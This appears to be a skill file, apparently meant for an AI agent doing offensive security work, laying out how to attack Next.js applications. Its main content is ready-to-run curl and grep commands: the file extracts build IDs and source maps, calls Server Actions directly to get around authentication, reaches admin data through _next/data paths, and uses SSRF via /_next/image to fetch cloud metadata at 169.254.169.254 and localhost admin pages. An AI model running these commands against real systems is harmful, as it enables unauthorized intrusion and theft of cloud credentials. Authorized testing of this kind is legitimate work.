---
name: hunt-nextjs
description: Hunt Next.js specific vulnerabilities — Server Actions arbitrary function execution, Middleware auth bypass via static asset paths, ISR cache poisoning, Image Optimization SSRF (/_next/image), RSC payload leakage, getServerSideProps injection, source map exposure, debug endpoint leakage. Use when target runs Next.js 13/14/15 or any React SSR framework.
sources: "cve_database (CVE-2024-34351 / GHSA-fr5h-rqp8-mj6g), Next.js advisories"
report_count: 0
---

# HUNT-NEXTJS — Next.js / SSR Framework Vulnerabilities

## Crown Jewel Targets
- **Server Actions auth bypass** — actions enforce auth client-side only → call action ID directly
- **Middleware bypass via `/_next/static/`** — middleware skips static paths → protected routes accessible
- **`/_next/image` SSRF** — Image optimizer fetches attacker-controlled URL
- **ISR stale cache poisoning** — inject malicious content into cached page
- **RSC payload leakage** — server-side props leaked to client

## Attack Surface Signals
```
/_next/image?url=&w=&q=              SSRF candidate
/_next/data/BUILD_ID/*.json          IDOR candidate
/__nextjs_original-stack-frame       Debug endpoint
__NEXT_DATA__ in HTML                SSR props leaked
```

## Phase 1 — Fingerprint & Build ID
```bash
BUILD_ID=$(curl -s https://$TARGET/ | grep -oP '"buildId":"\K[^"]+')
echo "Build ID: $BUILD_ID"

# Source map exposure
curl -s "https://$TARGET/_next/static/chunks/pages/index.js.map" | head -5
```

## Phase 2 — Server Actions Abuse
```bash
# Extract action IDs from client bundles
grep -oP 'actionId:"[^"]+"' /tmp/next_bundle.js | sort -u

# Call Server Action directly (bypass client-side auth)
curl -s -X POST "https://$TARGET/__nextjs_server_action/ACTION_ID" \
  -H "Content-Type: application/json" \
  -d '{"data": "..."}'
```

## Phase 3 — Middleware Bypass
```bash
# Middleware typically skips /_next/static/ paths
# Try accessing protected API via _next/data/ path
curl -s "https://$TARGET/_next/data/$BUILD_ID/api/admin/users.json"
```

## Phase 4 — _next/image SSRF
```bash
# Test basic SSRF
curl -s "https://$TARGET/_next/image?url=http://169.254.169.254/latest/meta-data/"
curl -s "https://$TARGET/_next/image?url=http://127.0.0.1:8080/admin"
```

## Related Skills
- **hunt-api-misconfig** — Server Action auth analysis
- **hunt-ssrf** — _next/image SSRF chain
- **hunt-rce** — if Server Action has eval/template sink
